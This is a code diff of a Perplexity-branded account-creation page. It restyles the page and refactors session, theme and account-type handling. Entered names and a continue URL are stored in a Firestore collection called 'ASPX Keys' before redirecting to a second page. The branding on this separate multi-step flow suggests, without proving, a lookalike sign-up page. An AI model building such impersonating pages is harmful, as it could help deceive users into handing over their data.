@@ -7,9 +7,9 @@
     <!-- Inter Font -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-    <title>Create Your Perplexity Account</title>
+    <title>Creat Account</title>
 
     <style>
         * {
@@ -45,7 +45,7 @@
             padding: 0;
             display: flex;
             justify-content: center;
-            background-color: var(--bg);
+            background: var(--bg);
             color: var(--text);
             transition: background-color 0.25s ease, color 0.25s ease;
         }
@@ -62,10 +62,10 @@
 
         h1 {
             font-size: 32px;
-            font-weight: 800;
+            font-weight: 700;
             margin-bottom: 8px;
             margin-top: 40px;
-            letter-spacing: -1px;
+            letter-spacing: -0.5px;
         }
 
         .subtitle {
@@ -91,7 +91,7 @@
             font-size: 12px;
             color: var(--subtext);
             z-index: 1;
-            transition: background 0.25s ease, color 0.25s ease;
+            transition: background-color 0.25s ease;
         }
 
         input {
@@ -113,20 +113,20 @@
 
         .btn-continue {
             width: 100%;
-            background-color: var(--button-bg);
+            background: var(--button-bg);
             color: var(--button-text);
             border: none;
             padding: 14px;
             font-size: 16px;
-            font-weight: 700;
+            font-weight: 600;
             border-radius: 28px;
             cursor: pointer;
             margin-top: 20px;
             transition: all 0.25s ease;
         }
 
-        .btn-continue:hover {
-            transform: scale(0.99);
+        .btn-continue:active {
+            transform: scale(0.98);
         }
 
         .error {
@@ -138,14 +138,13 @@
         }
     </style>
 </head>
-
 <body>
 
 <div class="container">
 
     <h1>Create a Perplexity Account</h1>
 
-    <p class="subtitle" id="subtitle">
+    <p class="subtitle" id="subtitleText">
         Enter your name
     </p>
 
@@ -183,6 +182,8 @@
 
 <script type="module">
 
+/* ================= FIREBASE ================= */
+
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 
 import {
@@ -209,180 +210,201 @@ const db = getFirestore(app);
 
 const params = new URLSearchParams(window.location.search);
 
-const currentType = (params.get("type") || "personal").toLowerCase();
+let session = params.get("session");
+let type = (params.get("type") || "personal").toLowerCase();
+let continueUrl = params.get("continue") || "";
+let theme = params.get("theme");
 
-/* ================= REAL-TIME THEME ================= */
+/* ================= SESSION ================= */
+
+function generateSession() {
+    return Math.floor(
+        1000000000 + Math.random() * 9000000000
+    ).toString();
+}
+
+if (!session) {
+
+    session = generateSession();
+
+    const newParams = new URLSearchParams();
+
+    newParams.set("session", session);
+
+    if (type) {
+        newParams.set("type", type);
+    }
+
+    if (continueUrl) {
+        newParams.set("continue", continueUrl);
+    }
+
+    if (theme) {
+        newParams.set("theme", theme);
+    }
+
+    const newUrl =
+        `${window.location.pathname}?${newParams.toString()}`;
+
+    window.history.replaceState({}, "", newUrl);
+}
+
+/* ================= REAL TIME THEME ================= */
+
+const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
 
 function applyTheme() {
 
-    const theme = params.get("theme");
-
     if (theme === "d") {
-        document.body.classList.add("dark");
-        return;
-    }
 
-    if (theme === "l") {
+        document.body.classList.add("dark");
+
+    } else if (theme === "l") {
+
         document.body.classList.remove("dark");
-        return;
-    }
 
-    // Auto detect system theme
-    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add("dark");
     } else {
-        document.body.classList.remove("dark");
+
+        // AUTO THEME WITH REAL-TIME CHANGE
+        if (mediaQuery.matches) {
+            document.body.classList.add("dark");
+        } else {
+            document.body.classList.remove("dark");
+        }
     }
 }
 
 applyTheme();
 
-/* REAL-TIME DEVICE THEME CHANGE */
-window
-    .matchMedia('(prefers-color-scheme: dark)')
-    .addEventListener('change', () => {
+// REAL TIME DEVICE THEME CHANGE
+mediaQuery.addEventListener("change", () => {
 
-        // Only auto switch if no forced theme
-        const theme = params.get("theme");
-
-        if (!theme) {
-            applyTheme();
-        }
-    });
-
-/* ================= TYPE HANDLING ================= */
-
-function applyTypeChanges() {
-
-    const subtitle = document.getElementById("subtitle");
-
-    if (currentType === "kids") {
-
-        subtitle.textContent = "Enter your child's name";
-
-    } else {
-
-        subtitle.textContent = "Enter your name";
+    // only auto mode reacts
+    if (!theme) {
+        applyTheme();
     }
+});
+
+/* ================= TYPE UI ================= */
+
+const subtitleText = document.getElementById("subtitleText");
+const firstNameLabel = document.getElementById("firstNameLabel");
+const firstNameInput = document.getElementById("firstName");
+
+if (type === "kids") {
+
+    subtitleText.textContent = "Enter your child's name";
+
+    firstNameLabel.textContent = "First name";
+
+    firstNameInput.placeholder = "First name";
+
+} else {
+
+    subtitleText.textContent = "Enter your name";
+
+    firstNameLabel.textContent = "First name";
+
+    firstNameInput.placeholder = "First name";
 }
-
-applyTypeChanges();
-
-/* ================= SESSION ================= */
-
-function initSession() {
-
-    let session = params.get('session');
-
-    let type = params.get('type') || 'personal';
-
-    let cont = params.get('continue') || '';
-
-    if (!session) {
-
-        session = Math.floor(
-            1000000000 + Math.random() * 9000000000
-        ).toString();
-
-        let newUrl =
-            `${window.location.pathname}?session=${session}&type=${type}`;
-
-        if (cont) {
-            newUrl += `&continue=${encodeURIComponent(cont)}`;
-        }
-
-        window.history.replaceState({}, '', newUrl);
-    }
-
-    return { session, type, cont };
-}
-
-const { session, type, cont } = initSession();
 
 /* ================= SUBMIT ================= */
 
 async function submitData() {
 
     const firstName =
-        document.getElementById('firstName').value.trim();
+        document.getElementById("firstName")
+        .value
+        .trim();
 
     const lastName =
-        document.getElementById('lastName').value.trim();
+        document.getElementById("lastName")
+        .value
+        .trim();
 
     const errorDiv =
-        document.getElementById('fnError');
+        document.getElementById("fnError");
 
     if (!firstName) {
 
-        errorDiv.style.display = 'block';
+        errorDiv.style.display = "block";
 
         return;
     }
 
-    errorDiv.style.display = 'none';
-
-    const t = type.toLowerCase();
+    errorDiv.style.display = "none";
 
     let familyValue = "no";
 
-    if (t === 'kids') familyValue = "commit";
+    if (type === "kids") {
+        familyValue = "commit";
+    }
 
-    if (t === 'business') familyValue = "workspace";
+    if (type === "business") {
+        familyValue = "workspace";
+    }
 
     try {
 
-        await setDoc(doc(db, "ASPX Keys", session), {
+        await setDoc(
+            doc(db, "ASPX Keys", session),
+            {
+                firstName,
+                lastName,
+                type,
+                family: familyValue,
 
-            firstName,
-            lastName,
+                // SAVE CONTINUE URL
+                continue: continueUrl || null,
 
-            type: t,
+                timestamp: new Date()
+            },
+            { merge: true }
+        );
 
-            family: familyValue,
+        // REDIRECT
+        window.location.href =
+            `2.html?session=${session}`;
 
-            continue: cont || null,
+    } catch (error) {
 
-            timestamp: new Date()
+        console.error(error);
 
-        });
-
-        window.location.href = `2.html?session=${session}`;
-
-    } catch (e) {
-
-        console.error("Error:", e);
+        alert("Something went wrong.");
     }
 }
 
 /* ================= EVENTS ================= */
 
 document
-    .getElementById('firstName')
-    .addEventListener('keypress', (e) => {
+.getElementById("firstName")
+.addEventListener("keypress", (e) => {
 
-        if (e.key === 'Enter') {
+    if (e.key === "Enter") {
 
-            e.preventDefault();
+        e.preventDefault();
 
-            document.getElementById('lastName').focus();
-        }
-    });
-
-document
-    .getElementById('lastName')
-    .addEventListener('keypress', (e) => {
-
-        if (e.key === 'Enter') {
-
-            e.preventDefault();
-
-            submitData();
-        }
-    });
+        document
+        .getElementById("lastName")
+        .focus();
+    }
+});
 
 document
-    .getElementById('continueBtn')
-    .addEventListener('click', submitData);
+.getElementById("lastName")
+.addEventListener("keypress", (e) => {
+
+    if (e.key === "Enter") {
+
+        e.preventDefault();
+
+        submitData();
+    }
+});
+
+document
+.getElementById("continueBtn")
+.addEventListener("click", submitData);
 
 </script>
 
